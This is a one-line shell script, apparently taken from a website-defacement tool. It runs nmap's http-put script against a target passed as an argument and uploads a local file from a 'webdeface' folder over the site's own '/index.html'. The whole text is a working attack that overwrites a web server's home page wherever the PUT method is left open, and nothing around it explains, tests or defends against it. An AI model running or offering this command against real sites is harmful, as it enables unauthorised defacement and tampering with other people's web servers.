nmap $1 -p 80 --script http-put --script-args http-put.url='/index.html',http-put.file='/webdeface/index.html'
